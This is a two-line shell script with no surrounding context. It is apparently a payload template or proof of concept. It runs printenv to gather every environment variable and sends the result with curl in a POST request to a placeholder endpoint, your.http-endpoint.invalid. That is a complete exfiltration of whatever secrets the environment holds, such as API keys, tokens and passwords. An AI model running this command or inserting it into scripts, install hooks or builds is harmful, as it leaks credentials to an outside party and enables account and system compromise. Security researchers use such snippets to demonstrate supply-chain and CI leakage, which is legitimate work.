#!/bin/sh

curl -d "$(printenv)" https://your.http-endpoint.invalid/
